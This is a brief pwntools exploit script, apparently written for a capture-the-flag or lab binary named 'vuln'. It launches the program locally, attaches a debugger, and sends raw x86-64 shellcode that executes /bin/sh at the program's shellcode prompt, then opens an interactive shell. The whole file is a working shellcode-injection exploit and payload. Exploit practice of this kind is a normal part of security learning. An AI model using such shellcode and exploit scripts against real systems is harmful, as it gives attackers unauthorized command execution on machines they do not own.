from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
context.log_level = 'debug'

p = process('./vuln')

print(asm(shellcraft.linux.sh()))

gdb.attach(p)
input('>')
# p.sendlineafter("Enter your shellcode:", asm(shellcraft.linux.sh()))
shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
p.sendlineafter("Enter your shellcode:", shellcode)

p.interactive()
